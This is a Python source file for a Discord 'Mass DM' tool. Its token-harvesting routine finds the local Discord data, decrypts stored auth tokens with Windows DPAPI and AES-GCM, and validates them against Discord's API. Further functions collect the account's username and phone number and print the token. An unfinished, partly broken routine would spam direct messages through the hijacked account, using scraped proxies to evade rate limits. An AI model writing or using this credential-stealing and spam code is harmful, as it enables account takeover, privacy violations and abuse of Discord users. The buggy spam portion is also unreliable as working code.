import os, re, json, requests,datetime, colorama, base64, subprocess, importlib
from json import loads, dumps
from colorama import *
from urllib.request import Request, urlopen
from json import loads, dumps


modules = [
    'urllib.request',
    'Crypto.Cipher',
    'ctypes',
    'json',
    'colorama'
]

missing_modules = []
proxy_list = []

def gather_modules():

    def install_module(module):
        subprocess.run(['pip', 'install', module], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
    def installing_module_prompt(module):
        print(f'{Fore.LIGHTBLACK_EX}{used()} {Fore.YELLOW}DOWNLOADING   {Fore.MAGENTA} installing.modules {Fore.WHITE} downloading module {module}.',install_module())

    def modules_install_prompt():
        print(f'{Fore.LIGHTBLACK_EX}{used()} {Fore.YELLOW}WARNING   {Fore.MAGENTA} missing.modules {Fore.WHITE} No modules to download on the system.')

    def installed_modules():
        for module_name in modules:
            try:importlib.import_module(module_name)
            except ImportError:missing_modules.append(module_name)
        if len(missing_modules) != 0:  
            for module in missing_modules:installing_module_prompt(module)
        else:modules_install_prompt()
    installed_modules()

def gather_proxy():
    for proxy in requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt').text.splitlines():proxy_list.append(proxy)
    return len(proxy_list)

def getheaders(token):
    headers = {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
    }
    
    if token: 
        headers.update({"Authorization": token})
    return headers

def gather_token():

    import urllib.request, urllib.error
    from Crypto.Cipher import AES
    from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
    from json import loads as json_loads, load
    from urllib.request import Request, urlopen
    
    def get_all():
        return get_tokens()
    
    def DecryptValue(buff, master_key=None):
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
    
    class DATA_BLOB(Structure):
        _fields_ = [
            ('cbData', wintypes.DWORD),
            ('pbData', POINTER(c_char))
        ]
    
    def GetData(blob_out):
        cbData = int(blob_out.cbData)
        pbData = blob_out.pbData
        buffer = c_buffer(cbData)
        cdll.msvcrt.memcpy(buffer, pbData, cbData)
        windll.kernel32.LocalFree(pbData)
        return buffer.raw
    
    def CryptUnprotectData(encrypted_bytes, entropy=b''):
        buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
        buffer_entropy = c_buffer(entropy, len(entropy))
        blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
        blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
        blob_out = DATA_BLOB()
    
        if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
            return GetData(blob_out)
    
    def get_tokens():
        tokens = []
        LOCAL = os.getenv("LOCALAPPDATA")
        ROAMING = os.getenv("APPDATA")
        PATHS = {
            "Discord": ROAMING + "\\Discord"
        }
        def search(path: str) -> list:
            path += "\\Local Storage\\leveldb"
            found_tokens = []
            if os.path.isdir(path):
                for file_name in os.listdir(path):
                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                        continue
                    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}", r"mfa\.[\w-]{84}"):
                            for token in re.findall(regex, line):
                                try: 
                                    urllib.request.urlopen(urllib.request.Request(
                                        "https://discord.com/api/v9/users/@me",
                                        headers={
                                            'content-type': 'application/json', 
                                            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
                                            'authorization': token
                                        }
                                    ))
                                except urllib.error.HTTPError as e:
                                    continue
                                if token not in found_tokens and token not in tokens:
                                    found_tokens.append(token)
            return found_tokens
        
        def encrypt_search(path):
            if not os.path.exists(f"{path}/Local State"): return []
            pathC = path + "\\Local Storage\\leveldb"
            found_tokens = []
            pathKey = path + "/Local State"
            with open(pathKey, 'r', encoding='utf-8') as f: local_state = json.loads(f.read())
            master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            master_key = CryptUnprotectData(master_key[5:])
    
            for file in os.listdir(pathC):
                if file.endswith(".log") or file.endswith(".ldb")   :
                    for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                        for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            tokenDecoded = DecryptValue(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                            try: 
                                urllib.request.urlopen(urllib.request.Request(
                                    "https://discord.com/api/v9/users/@me",
                                    headers={
                                        'content-type': 'application/json', 
                                        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
                                        'authorization': tokenDecoded
                                    }
                                ))
                            except urllib.error.HTTPError as e:
                                continue
                            if tokenDecoded not in found_tokens and tokenDecoded not in tokens:
                                found_tokens.append(tokenDecoded)
            return found_tokens
    
        for path in PATHS:
            for token in search(PATHS[path]):
                tokens.append(token)
            for token in encrypt_search(PATHS[path]):
                tokens.append(token)
        return tokens


    return get_tokens()[0]

def gather_ip():
    return requests.get("http://ipinfo.io/json").json()['ip']

def gather_user():
    return os.getenv('USERNAME')

def used():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def gather_discord_username(token):
    return requests.get('https://discord.com/api/v6/users/@me', headers=getheaders(token)).json()['username']

def gather_discord_phone(token):
    return requests.get('https://discord.com/api/v6/users/@me', headers=getheaders(token)).json()['phone']

def set_console_title(title):
    os.system(f'title "{title}"')

def input_prompt():
    return f'{Fore.GREEN}[{Fore.GREEN}{Fore.WHITE}?{Fore.WHITE}{Fore.GREEN}]{Fore.GREEN}'

def print_prompt():
    return f'{Fore.GREEN}[{Fore.GREEN}{Fore.WHITE}!{Fore.WHITE}{Fore.GREEN}]{Fore.GREEN}'

def is_path_exist(token):
    for path in os.listdir(absolute_path()):
        if path == f'{gather_discord_username(token=token)}.json': os.remove(path)

def absolute_path():
    return os.path.dirname(os.path.abspath(__file__))

def write_info(token):
    is_path_exist(token=token)
    user_info = requests.get('https://discord.com/api/v6/users/@me', headers=getheaders(token)).json()
    with open(f'{gather_discord_username(token=token)}.json', 'w') as file:
        json.dump(user_info, file, indent=4)

def check_token(token):
        
    if requests.get('https://discord.com/api/v9/users/@me', headers=getheaders(token)).status_code == 200:
        pass
    else:
        print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.RED} Wrong token !')
        input()
        exit()

def Mass_Dm():
    
    #still in dev
    def spam_mp(content):
        try:
            channel = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token))


            for element in channel.json():
                id_channel = element['id']
                try:
                    requests.get(f'https://discord.com/api/v9/channels/{id_channel}/messages',
                    data={"content": f"{content}"},
                    headers={'Authorization': token})
                    
                    if 'message' == 'Unknown Channel':
                        print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE}{Fore.RED} An error occured while sending mp {Fore.RED}')
                    
                    else:
                         print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE} Scraping dm : {id_channel}')
                except:
                        print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE}{Fore.RED} An error occured while sending mp {Fore.RED}')
        except:
            print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE}{Fore.RED} An error occured while sending mp {Fore.RED}')
            print(channel)

    
    token = input(f'{Fore.LIGHTBLACK_EX}{used()} {input_prompt()}{Fore.WHITE} Enter Token to MassDm :')
    check_token(token=token)
    print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE} Sucessfully log into {gather_discord_username(token=token)}')
    write_info(token=token)
    print(f'{Fore.LIGHTBLACK_EX}{used()} {print_prompt()}{Fore.WHITE} Target account info upload to {Fore.RED}{gather_discord_username(token=token)}.json{Fore.RED}')
    content = input(f'{Fore.LIGHTBLACK_EX}{used()} {input_prompt()}{Fore.WHITE} Enter the message to sent trough {Fore.RED}{gather_discord_username(token=token)}{Fore.RED}{Fore.WHITE} account :')
   
def main():
    set_console_title(f'DMIZE - Mass DM | connect as {gather_discord_username(token=gather_token())} : {gather_discord_phone(token=gather_token())}')
    gather_modules()
    print(f'{Fore.LIGHTBLACK_EX}{used()} {Fore.YELLOW}WARNING   {Fore.MAGENTA} acces.point.gateway {Fore.WHITE} Proxies could be add if the hoster IP get rate limit {gather_ip()}.')
    print(f'{Fore.LIGHTBLACK_EX}{used()} {Fore.BLUE}INFO      {Fore.MAGENTA} autorization.user {Fore.WHITE} logging in using static token {gather_token()}.')
    print(f'{Fore.LIGHTBLACK_EX}{used()} {Fore.BLUE}INFO      {Fore.MAGENTA} login.user {Fore.WHITE} Session connect on {gather_user()}')
    print(f'{Fore.LIGHTBLACK_EX}{used()} {Fore.RED}SCRAPING  {Fore.MAGENTA} update.gateway {Fore.WHITE} Scraping proxies to avoid rate limit risk -> Proxies scrap =  {gather_proxy()}')
    Mass_Dm()
    input()

if __name__ == "__main__":
    Mass_Dm()